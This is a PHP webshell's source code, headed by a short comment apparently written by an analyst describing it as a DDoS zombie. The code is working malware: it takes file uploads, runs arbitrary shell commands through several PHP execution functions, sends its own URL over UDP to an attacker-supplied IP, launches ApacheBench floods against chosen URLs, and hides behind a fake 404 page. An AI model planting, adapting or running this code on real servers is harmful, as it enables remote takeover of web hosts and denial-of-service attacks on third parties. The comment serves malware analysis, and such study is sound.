/*
 *
 *	This webshell's main purpose is to be used as a zobie during a DDoS attack.
 *	Allows for file uploads,
 *	allows for quick stopping of a ping based DoS (which presumably use files that will be deleted after the attack is stopped),
 *	commonucates on port 11 / UDP (I presume this allows on some unixes to list currently active users),
 *	builds a link to itself (I'm not sure why is that useful),
 *	allows for command execution on the host,
 *	it tries to hide itself by faking a 404 response from the server,
 *	it also allows to benchmark apache's performance.
 *
 */
 <?php
@set_time_limit(0);
@error_reporting(0);
$base = dirname(__FILE__)."/";
function stoped()
{
    @unlink($base."stmdu.php");
    @unlink($base."stp.hp");
    cmdexec("killall ping;");
    print "<stopcleandos>Stop & Clean</stopcleandos>";
}
function UploadFile($File)
{
    $target_path ="./";
    $target_path = $target_path . basename( $File['name']);
    @move_uploaded_file($File['tmp_name'], $target_path);
}
function cmdexec($cmd)
{
    if(function_exists('exec'))@exec($cmd);
    elseif(function_exists('passthru'))@passthru($cmd);
    elseif(function_exists('shell_exec'))@shell_exec($cmd);
    elseif(function_exists('system'))@system($cmd);
    elseif(function_exists('popen'))@popen($cmd,"r");
}
function curPageURL()
{
    $pageURL = 'http';
    if ($_SERVER["HTTPS"] == "on")
    {
        $pageURL .= "s";
    }
    $pageURL .= "://";
    if ($_SERVER["SERVER_PORT"] != "80")
    {
        $pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
    }
    else
    {
        $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
    }
    return $pageURL;
}
function DNullRequest()
{
    @ob_start();
    print "<!DOCTYPE HTML PUBLIC\"-//IETF//DTDHTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server </p><p>Additionally, a 404 Not Foun derror was encountered while trying to use an Error Document to handle the request</p></body ></html >";
    die();
    exit();
}
if ($_GET['action']=="status")
{
    print "That is good";
    exit();
}

switch($_POST['action'])
{
    case "upload":UploadFile($_FILES['file']);
    break;
    case "stop":stoped();
    break;
    case "ust":$page = curPageURL();
    $ip = $_POST['ip'];
    $port = "11";
    $out = $page."\n";
    $socket = stream_socket_client("udp://$ip:$port");
    if ($socket) {stream_set_write_buffer($socket, 0);
    stream_socket_sendto($socket,$out);
}
fclose($socket);
break;
case "ab":$url = $_POST['url'];
$c = $_POST['c'];
$n = $_POST['n'];
cmdexec("ab -c $c -n $n $url");
break;
default:DNullRequest();
break;
}
?>
